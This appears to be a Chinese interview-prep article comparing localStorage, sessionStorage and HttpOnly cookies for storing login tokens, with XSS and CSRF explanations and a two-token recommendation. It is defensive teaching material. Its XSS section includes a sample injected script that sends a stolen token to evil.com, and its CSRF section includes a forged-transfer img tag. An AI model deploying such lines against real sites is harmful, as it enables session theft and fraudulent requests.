<!--
question:
  id: 09.front-end-token-storage-security
  topic: 09.front-end
  difficulty: ⭐⭐⭐⭐
  frequency: 高频
  scenario_type: 安全陷阱
  tags: [09.front-end, token, jwt, security, xss, csrf]
-->

# 用户登录 Token 存储在哪里？localStorage 的安全漏洞

## 引子：一个常见的面试题

面试官："用户登录后的 Token 存储在哪里？"

候选人："localStorage 啊，简单方便。"

面试官："那你知道 localStorage 有什么安全问题吗？如果 Token 被 XSS 攻击窃取怎么办？"

候选人："呃..."

---

**Token 存储的 3 种方式**：
1. localStorage（最常见，但有 XSS 风险）
2. sessionStorage（会话级，关闭标签页即清除）
3. HttpOnly Cookie（最安全，但有 CSRF 风险）

**没有完美方案**，只有"权衡取舍"。

## 一、核心原理：3 种存储方式对比

### 1.1 localStorage

```javascript
// 存储 Token
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// 读取 Token
const token = localStorage.getItem('token');

// 发送请求时带上
fetch('/api/user', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**优点**：
- 简单方便，API 易用
- 持久化存储（关闭浏览器不清除）
- 同域名下所有页面共享

**缺点**：
- ❌ **XSS 攻击可窃取**：`alert(document.cookie)` 拿不到 HttpOnly Cookie，但 `localStorage.getItem('token')` 可以拿到
- ❌ **无法设置过期时间**：需要手动管理（定时检查 + 清除）

### 1.2 sessionStorage

```javascript
// 存储 Token
sessionStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// 读取 Token
const token = sessionStorage.getItem('token');
```

**优点**：
- 会话级存储（关闭标签页即清除）
- 比 localStorage 稍微安全（生命周期短）

**缺点**：
- ❌ **仍有 XSS 风险**：`sessionStorage.getItem('token')` 可被窃取
- ❌ **标签页隔离**：新开标签页需要重新登录（用户体验差）

### 1.3 HttpOnly Cookie

```javascript
// 后端设置（Node.js 示例）
res.cookie('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...', {
  httpOnly: true,      // ✅ JavaScript 无法访问
  secure: true,        // ✅ 只通过 HTTPS 传输
  sameSite: 'strict',  // ✅ 防止 CSRF
  maxAge: 3600000      // 1 小时过期
});

// 前端发送请求时自动带上（无需手动处理）
fetch('/api/user');  // Cookie 自动附带
```

**优点**：
- ✅ **XSS 无法窃取**：`document.cookie` 拿不到 HttpOnly Cookie
- ✅ **自动过期**：浏览器自动管理
- ✅ **自动附带**：请求时自动带上，无需手动处理

**缺点**：
- ❌ **CSRF 攻击风险**：跨站请求会自动带上 Cookie
- ❌ **跨域复杂**：需要配置 CORS + credentials

## 二、2 大安全攻击详解

### 2.1 XSS 攻击（Cross-Site Scripting）

**攻击原理**：
```text
1. 攻击者在页面注入恶意脚本（如评论框输入 <script>...</script>）
2. 脚本执行：alert(localStorage.getItem('token'))
3. Token 被窃取，发送到攻击者服务器
4. 攻击者用窃取的 Token 冒充用户
```

**示例**：
```javascript
// 攻击者注入的脚本
const token = localStorage.getItem('token');
fetch('https://evil.com/steal?token=' + token);
```

**防护**：
- ✅ 用 HttpOnly Cookie（JavaScript 无法访问）
- ✅ 输入过滤 + 输出转义（防止脚本注入）
- ✅ CSP（Content Security Policy）限制脚本来源

### 2.2 CSRF 攻击（Cross-Site Request Forgery）

**攻击原理**：
```text
1. 用户登录 bank.com，Token 存在 Cookie 中
2. 用户访问 evil.com，页面包含：
   <img src="https://bank.com/transfer?to=attacker&amount=1000">
3. 浏览器自动带上 bank.com 的 Cookie
4. 转账请求成功，用户损失 1000 元
```

**防护**：
- ✅ `sameSite: 'strict'` Cookie 属性（跨站不发送 Cookie）
- ✅ CSRF Token（后端生成随机 Token，前端每次请求带上）
- ✅ 验证 Referer / Origin 头部

## 三、生产推荐方案

### 3.1 最佳实践：双 Token 方案

```text
Access Token（短期）：
  - 存储：localStorage / sessionStorage
  - 有效期：15 分钟 ~ 2 小时
  - 用途：API 请求鉴权
  - 泄露风险：可控（短期有效）

Refresh Token（长期）：
  - 存储：HttpOnly Cookie
  - 有效期：7 天 ~ 30 天
  - 用途：刷新 Access Token
  - 泄露风险：可控（HttpOnly + sameSite）
```

**流程**：
```text
1. 用户登录 → 后端返回 Access Token + Refresh Token
2. 前端存储：
   - Access Token → localStorage
   - Refresh Token → HttpOnly Cookie（后端设置）
3. API 请求：
   - 带上 Access Token（Authorization: Bearer xxx）
   - 浏览器自动带上 Refresh Token（Cookie）
4. Access Token 过期 → 后端用 Refresh Token 刷新
5. Refresh Token 过期 → 重新登录
```

**优点**：
- Access Token 短期有效，泄露风险可控
- Refresh Token HttpOnly，XSS 无法窃取
- 兼顾安全性和用户体验

### 3.2 方案对比

| 方案 | XSS 防护 | CSRF 防护 | 复杂度 | 推荐度 |
|------|---------|----------|--------|--------|
| **纯 localStorage** | ❌ 差 | ✅ 好 | ⭐ | ⭐⭐ |
| **纯 HttpOnly Cookie** | ✅ 好 | ❌ 差 | ⭐⭐ | ⭐⭐⭐ |
| **双 Token 方案** | ✅ 好 | ✅ 好 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

## 四、面试话术（30 秒版）

> "Token 存储有 3 种方式：**localStorage** 简单方便但有 XSS 风险（`localStorage.getItem('token')` 可被窃取）；**sessionStorage** 会话级存储，关闭标签页清除，但仍有 XSS 风险；**HttpOnly Cookie** 最安全（JavaScript 无法访问），但有 CSRF 风险（跨站请求自动带上）。
>
> 生产推荐**双 Token 方案**：Access Token（短期，存 localStorage，15 分钟有效）+ Refresh Token（长期，存 HttpOnly Cookie，7 天有效）。Access Token 泄露风险可控（短期），Refresh Token 用 HttpOnly 防 XSS + sameSite 防 CSRF。兼顾安全性和用户体验。"

## 五、交叉引用

- [XSS 与 CSRF 攻击防御深度剖析](../xss-csrf/README.md) — XSS 和 CSRF 攻击原理 + 防护
- [HTTPS 握手过程](../https-handshake/README.md) — HTTPS 加密传输
- 主模块：[`09.front-end`](../../../../note/09.front-end/) — 前端知识体系

## 相关章节

- 深度阅读：[`09.front-end`](09.front-end/README.md) — 主模块详细内容

← [返回: 咬文嚼字 · 09.front-end](../README.md)
